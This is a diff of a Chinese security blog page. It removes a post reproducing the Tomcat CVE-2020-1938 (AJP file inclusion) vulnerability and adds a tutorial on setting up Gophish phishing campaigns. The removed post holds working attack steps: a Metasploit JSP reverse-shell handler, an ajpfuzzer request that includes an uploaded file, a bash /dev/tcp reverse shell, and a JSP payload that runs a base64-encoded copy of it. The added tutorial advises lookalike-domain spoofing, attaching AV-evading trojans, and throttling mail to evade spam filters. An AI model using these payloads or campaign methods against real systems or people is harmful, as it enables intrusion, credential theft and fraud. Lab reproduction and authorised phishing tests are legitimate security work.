@@ -8,7 +8,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    CVE-2020-1938漏洞复现 |  Wh1tecell&#39;blog
+    Gophish-钓鱼平台的使用 |  Wh1tecell&#39;blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -43,7 +43,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-CVE-2020-1938漏洞复现"
+  id="post-Gophish-钓鱼平台的使用"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -54,18 +54,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  CVE-2020-1938漏洞复现
+  Gophish-钓鱼平台的使用
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/08/11/CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time datetime="2021-08-11T02:55:45.000Z" itemprop="datePublished">2021-08-11</time>
+      <a href="/2021/08/23/Gophish-%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time datetime="2021-08-23T02:57:34.000Z" itemprop="datePublished">2021-08-23</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a> / <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tomcat/">tomcat</a>
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/gophish/">gophish</a>
   </div>
   
 <div class="word_count">
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">558</span>
+            <span class="post-count">2.7k</span>
         </span>
     </span>
 
@@ -82,7 +82,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">9 分钟</span>
         </span>
     </span>
 </div>
@@ -97,45 +97,92 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>环境直接在vulhub里面搭建</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
-<li>Apache Tomcat 9.x &lt; 9.0.31</li>
-<li>Apache Tomcat 8.x &lt; 8.5.51</li>
-<li>Apache Tomcat 7.x &lt; 7.0.100</li>
-<li>Apache Tomcat 6.x</li>
-</ul>
-<h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>可以看到端口8009开放了</p>
-<p><img src="https://img-blog.csdnimg.cn/8fd906e5a4c14c58a6c0e6b9e5a3d0b4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>先进入漏洞环境写入一个1.txt</p>
-<p><img src="https://img-blog.csdnimg.cn/20506acf481e40f786eec1834bfe3cf3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>直接利用漏洞脚本打</p>
-<p><img src="https://img-blog.csdnimg.cn/ee8193e280b740bab32397d6b7363802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>默认的读取目录是 </p>
-<p><code>webapps文件夹下ROOT的文件</code></p>
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>下面配合文件上传的点进行rce 假设有一个文件上传的点我们上传一个shell.jsp</p>
-<p>我这里是用msf  当然也可以用上面文件读取的脚本我都会复现</p>
-<p><strong>姿势一：</strong></p>
-<p>首先是msf的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.在msf监听：</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp</span><br><span class="line"></span><br><span class="line">payload =&gt; java/jsp_shell_reverse_tcp</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.3.68</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; set lport 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt;exploit</span><br><span class="line"></span><br><span class="line">2.发送AJP包，获取shell</span><br><span class="line">使用AJP包构造工具来发送ajp包，以ajpfuzzer为例：</span><br><span class="line"></span><br><span class="line">运行：java -jar ajpfuzzer_v0.6.jar</span><br><span class="line"></span><br><span class="line">连接目标端口：connect 192.168.3.68 8009</span><br><span class="line"></span><br><span class="line">执行以下命令：</span><br><span class="line"></span><br><span class="line">forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/123.jsp&quot; 192.168.3.68 192.168.3.68 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:/&quot;,&quot;javax.servlet.include.path_info:shell.png&quot;,&quot;javax.servlet.include.servlet_path:/&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看到成功回连了</p>
-<p><img src="https://img-blog.csdnimg.cn/467dc38fcca54c5ebef48a4a5d50afcb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>姿势二：</strong></p>
-<p>准备好的反弹shell姿势如下：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/10.0.2.15/</span><span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>为了能正常执行需要对命令进行编码并组装成bash，推荐<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://www.jackson-t.ca/runtime-exec-payloads.html">在线bash payload生成</a>。在webapp下任意文件夹或者直接在该目录下放一个txt或者其他非jsp文件（总之不能被解析就对了）</p>
-<p>payload文件<code>test.txt</code>如下：</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">byte</span>[] b = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">out</span>.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">out</span>.println(<span class="keyword">new</span> String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">out</span>.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py   [ip]  -f  text.txt</span><br></pre></td></tr></table></figure>
-
-<p>另一端监听 就可以反弹shell了</p>
-<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>文件包含漏洞，主要是AJP/1.3协议。<br>简单粗暴的方法是将这句话注释。<br>server.xml文件中注释</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;Connector port=<span class="string">&quot;8009&quot;</span> protocol=<span class="string">&quot;AJP/1.3&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;--&gt;</span><br></pre></td></tr></table></figure>
+  <h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/gophish/gophish/releases/">https://github.com/gophish/gophish/releases/</a> 选择自己对应的系统</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>打开配置文件config.json</p>
+<p><img src="https://img-blog.csdnimg.cn/392a0715c5c448c19d1f07c3c8ee1f2a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这里的3333端口是运行gophish平台整体使用的端口</p>
+<p>8041端口是我们发送钓鱼页面的服务端口</p>
+<p>然后，访问 <a target="_blank" rel="noopener" href="https://your-ip:3333/">https://your-ip:3333/</a> 即可登录管理后台（<strong>注意使用https协议</strong>）</p>
+<p>账号和密码会在启动服务的时候给你</p>
+<h2 id="Gophish-平台相关功能"><a href="#Gophish-平台相关功能" class="headerlink" title="Gophish 平台相关功能"></a>Gophish 平台相关功能</h2><p>该Gophish平台具有如下几个功能，均需要进行配置。</p>
+<table>
+<thead>
+<tr>
+<th>功能</th>
+<th>简述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Dashboard</td>
+<td>仪表板，查看整体测试情况</td>
+</tr>
+<tr>
+<td>Campaigns</td>
+<td>每次攻击前需要配置一次</td>
+</tr>
+<tr>
+<td>Users &amp; Groups</td>
+<td>用户和用户组（添加需要进行钓鱼的邮箱和相关基础信息）</td>
+</tr>
+<tr>
+<td>Email Templates</td>
+<td>电子邮件模板</td>
+</tr>
+<tr>
+<td>Landing Pages</td>
+<td>需要伪造的钓鱼页面</td>
+</tr>
+<tr>
+<td>Sending Profiles</td>
+<td>钓鱼邮箱发送配置</td>
+</tr>
+</tbody></table>
+<h2 id="Sending-Profiles（钓鱼邮箱发送配置）"><a href="#Sending-Profiles（钓鱼邮箱发送配置）" class="headerlink" title="Sending Profiles（钓鱼邮箱发送配置）"></a>Sending Profiles（钓鱼邮箱发送配置）</h2><p>先看看我的配置</p>
+<p><img src="https://img-blog.csdnimg.cn/b6bb9c7226664318b0a9b956d131cc36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><strong>我这里使用的是qq邮箱 使用什么邮箱需要去开启对应的smtp服务</strong></p>
+<p><strong>密码填的是开启后给的授权码</strong></p>
+<p><strong>各个字段介绍</strong></p>
+<p><strong>Name：</strong>Name字段是为新建的发件策略进行命名，不会影响到钓鱼的实施，建议以发件邮箱为名字，例如使用qq邮箱来发送钓鱼邮件，则Name字段可以写 <a href="mailto:&#120;&#x78;&#120;&#120;&#x78;&#x78;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;">&#120;&#x78;&#120;&#120;&#x78;&#x78;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;</a> 。</p>
+<p><strong>Interface Type：</strong>Interface Type 是接口类型，默认为 SMTP类型 且不可修改，因此需要发件邮箱开启SMTP服务</p>
+<p><strong>From：</strong>From 是发件人，即钓鱼邮件所显示的发件人。（在实际使用中，一般需要进行近似域名伪造）这里为了容易理解，就暂时以qq邮箱为例，所以From字段可以写： test。</p>
+<p><strong>Host：</strong>Host 是SMTP服务器的地址，格式是 smtp.example.com:25，例如qq邮箱的smtp服务器地址为 smtp.qq.com。但这里要注意，如果搭建Gophish平台用的vps是阿里云的话，是不能使用25端口的，因为阿里云禁用25端口，你可以通过提工单解封，但申请通过的难度很大。所以，我们这里可以把25端口改为465端口，即填写 smtp.qq.com:465，这样就可以成功发送邮件了。</p>
+<p><strong>Username：</strong>Username 是SMTP服务认证的用户名，如果是qq邮箱，Username则是自己的qq邮箱号 <a href="mailto:&#x78;&#x78;&#120;&#120;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">&#x78;&#x78;&#120;&#120;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;</a>。</p>
+<p><strong>Password：</strong>Password 是SMTP服务认证的密码，例如qq邮箱，需要在登录qq邮箱后，依次点击 “设置”—&gt;“账户”—&gt;“开启SMPT服务”—&gt;“生成授权码”来获取SMTP服务授权码，Password的值则填写我们收到的授权码。</p>
+<p><strong>Email Headers（选填）：</strong>Email Headers 是自定义邮件头字段，例如邮件头的 X-Mailer 字段，若不修改此字段的值，通过gophish发出的邮件，其邮件头的X-Mailer的值默认为gophish。</p>
+<p>设置好以上字段，可以点击 “Send Test Email” 来给自己发送一个测试邮件，以检测SMTP服务器是否认证通过。如下，成功收到测试邮件，说明SMTP服务器是否认证通过：</p>
+<h2 id="Email-Templates（钓鱼邮件模板）"><a href="#Email-Templates（钓鱼邮件模板）" class="headerlink" title="Email Templates（钓鱼邮件模板）"></a>Email Templates（钓鱼邮件模板）</h2><p>完成了邮箱配置之后，就可以使用gophish发送邮件了。所以，接下来需要去编写钓鱼邮件的内容<br>点击<code>New Template</code>新建钓鱼邮件模板，依次介绍填写各个字段</p>
+<p><strong>Name:</strong><br>同样的，这个字段是对当前新建的钓鱼邮件模板进行命名。可以简单的命名为：<code>邮件模板1</code></p>
+<p><strong>Import Email:</strong><br>gophish为编辑邮件内容提供了两种方式，第一种就是Import Email</p>
+<p>用户可以先在自己的邮箱系统中设计好钓鱼邮件，然后发送给自己或其他伙伴，收到设计好的邮件后，打开并选择导出为eml文件或者显示邮件原文，然后将内容复制到gophish的Import Email中，即可将设计好的钓鱼邮件导入</p>
+<p>需要注意，在点击<code>Import</code>之前需要勾选上<code>Change Links to Point to Landing Page</code>，该功能实现了当创建钓鱼事件后，会将邮件中的超链接自动转变为钓鱼网站的URL</p>
+<p><strong>Subject:</strong><br>Subject 是邮件的主题，通常为了提高邮件的真实性，需要自己去编造一个吸引人的主题。这里简单填写成<code>“第一次钓鱼测试”</code></p>
+<p><strong>内容编辑框：</strong><br>内容编辑框是编写邮件内容的第二种模式，内容编辑框提供了<code>Text</code>和<code>HTML</code>两种模式来编写邮件内容，使用方式与正常的编辑器无异。<br>其中HTML模式下的<code>预览功能</code>比较常用到，在编辑好内容后，点击预览，就可以清晰看到邮件呈现的具体内容以及格式</p>
+<p><strong>Add Tracking Image:</strong><br>Add Tracking Image 是在钓鱼邮件末添加一个跟踪图像，用来跟踪受害用户是否打开了收到的钓鱼邮件。默认情况下是勾选的，如果不勾选就无法跟踪到受害用户是否打开了钓鱼邮件<br>（注：跟踪受害用户是否点击钓鱼链接以及捕捉提交数据不受其影响）</p>
+<p><strong>Add Files:</strong><br>Add Files 是在发送的邮件中<code>添加附件</code>，一是可以添加相关文件提高邮件真实性，二是可以配合免杀木马诱导受害用户下载并打开</p>
+<p>当填写完以上字段后，点击<code>Save Template</code>，就能保存当前编辑好的钓鱼邮件模板</p>
+<h2 id="Users-amp-Groups-用户和组"><a href="#Users-amp-Groups-用户和组" class="headerlink" title="Users &amp; Groups 用户和组"></a>Users &amp; Groups 用户和组</h2><p>当完成上面三个功能的内容编辑，钓鱼准备工作就已经完成了80%，<code>Users &amp; Groups</code> 的作用是将钓鱼的目标邮箱导入gophish中准备发送<br>点击<code>New Group</code>新建一个钓鱼的目标用户组</p>
+<p><strong>Name:</strong><br>Name 是为当前新建的用户组命名，这里简单命名为<code>目标1组</code></p>
+<p><strong>Bulk Import Users:</strong><br>Bulk Import Users是批量导入用户邮箱，它通过上传符合特定模板的CSV文件来批量导入目标用户邮箱<br>点击旁边灰色字体的Download CSV Template可以下载特定的CSV模板文件。其中，模板文件的Email是必填项，其余的Frist Name 、Last Name、Position可选填</p>
+<p><strong>Add:</strong><br>除了批量导入目标用户的邮箱，gophish也提供了单个邮箱的导入方法，这对于开始钓鱼前，钓鱼组内部测试十分方便，不需要繁琐的文件上传，直接填写<code>Email</code>即可，同样其余的<code>Frist Name</code> 、<code>Last Name</code>、<code>Position</code>可选填</p>
+<p>编辑好目标用户的邮箱后，点击<code>Save Changes</code>即可保存编辑好的目标邮箱保存在gophish中</p>
+<h2 id="Campaigns-钓鱼事件"><a href="#Campaigns-钓鱼事件" class="headerlink" title="Campaigns 钓鱼事件"></a>Campaigns 钓鱼事件</h2><p>Campaigns 的作用是将上述四个功能<code>Sending Profiles</code> 、<code>Email Templates</code> 、<code>Landing Pages</code> 、<code>Users &amp; Groups</code>联系起来，并创建钓鱼事件</p>
+<p><strong>在Campaigns中，可以新建钓鱼事件，并选择编辑好的钓鱼邮件模板，钓鱼页面，通过配置好的发件邮箱，将钓鱼邮件发送给目标用户组内的所有用户</strong></p>
+<p>点击<code>New Campaign</code>新建一个钓鱼事件</p>
+<p><strong>Name:</strong><br>Name 是为新建的钓鱼事件进行命名，这里简单命名为<code>第一次钓鱼</code></p>
+<p><img src="https://img-blog.csdnimg.cn/78eb10da1f794f398db50b1fe89f0c00.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>选择刚刚配置好的选项</p>
+<p><strong>（重点）URL:</strong><br>URL 是用来替换选定钓鱼邮件模板中超链接的值，该值指向部署了选定钓鱼页面的url网址（这里比较绕，下面具体解释一下，看完解释再来理解这句话）</p>
+<p>简单来说，这里的URL需要填写当前运行gophish脚本主机的ip。<br>因为启动gophish后，gophish默认监听了3333和80端口，其中3333端口是后台管理系统，而81端口就是用来部署钓鱼页面的。<br>当URL填写了http://主机IP/，并成功创建了当前的钓鱼事件后。gophish会在主机的80端口部署当前钓鱼事件所选定的钓鱼页面，并在发送的钓鱼邮件里，将其中所有的超链接都替换成部署在80端口的钓鱼页面的url</p>
+<p>所以，这里的URL填写我本地当前运行gophish主机的IP对应的url，即<a target="_blank" rel="noopener" href="http://ip:8041/">http://IP:8041</a></p>
+<p><strong>Launch Date:</strong><br>Launch Date 即钓鱼事件的实施日期，通常如果仅发送少量的邮箱，该项不需要修改。如果需要发送大量的邮箱，则配合旁边的<code>Send Emails By</code>效果更佳</p>
+<p><strong>（可选）Send Emails By:</strong><br>Send Emails By 配合Launch Date使用，可以理解为当前钓鱼事件下所有钓鱼邮件发送完成的时间。Launch Date作为起始发件时间，Send Emails By 作为完成发件时间，而它们之间的时间将被所有邮件以分钟为单位平分。</p>
+<p>例如，Launch Date的值为2020.07.22，09:00，Send Emails By的值为2020.07.22，09:04，该钓鱼事件需要发送50封钓鱼邮件。<br>那么经过以上设定，从9:00到9:04共有5个发件点，这5个发件点被50封邮件平分，即每个发件点将发送10封，也就是每分钟仅发送10封。</p>
+<p>这样的好处在于，当需要发送大量的钓鱼邮件，而发件邮箱服务器并未限制每分钟的发件数，那么通过该设定可以限制钓鱼邮件不受约束的发出，从而防止因短时间大量邮件抵达目标邮箱而导致的垃圾邮件检测，甚至发件邮箱服务器IP被目标邮箱服务器封禁</p>
+<p><strong>Sending Profile:</strong><br>Sending Profile 即发件策略，这里选择刚刚编辑好的名为<code>XXXXX@163.com</code>的发件策略</p>
+<p><strong>Groups:</strong><br>Groups 即接收钓鱼邮件的目标用户组，这里选择刚刚编辑好的名为<code>目标1组</code>的目标用户组</p>
+<p>填写完以上字段，点击<code>Launch Campaign</code>后将会创建本次钓鱼事件（注意：如果未修改<code>Launch Date</code>，则默认在创建钓鱼事件后就立即开始发送钓鱼邮件）</p>
+<h2 id="Dashboard-仪表板"><a href="#Dashboard-仪表板" class="headerlink" title="Dashboard 仪表板"></a><strong>Dashboard 仪表板</strong></h2><p>当创建了钓鱼事件后，Dashboard 会自动开始统计数据。统计的数据项包括邮件发送成功的数量及比率，邮件被打开的数量及比率，钓鱼链接被点击的数量及比率，账密数据被提交的数量和比率，以及收到电子邮件报告的数量和比率。另外，还有时间轴记录了每个行为发生的时间点</p>
+<p>收到数据后会展示出来</p>
  
       <!-- reward -->
       
@@ -200,7 +247,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/08/11/CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/08/23/Gophish-%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%BD%BF%E7%94%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -211,19 +258,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/08/23/Gophish-%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            Gophish-钓鱼平台的使用
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/08/10/win10%E4%B9%8Buac%E7%BB%95%E8%BF%87/" class="article-nav-link">
+      <a href="/2021/08/11/CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">win10之uac绕过</div>
+        <div class="article-nav-title">CVE-2020-1938漏洞复现</div>
       </a>
     
   </nav>
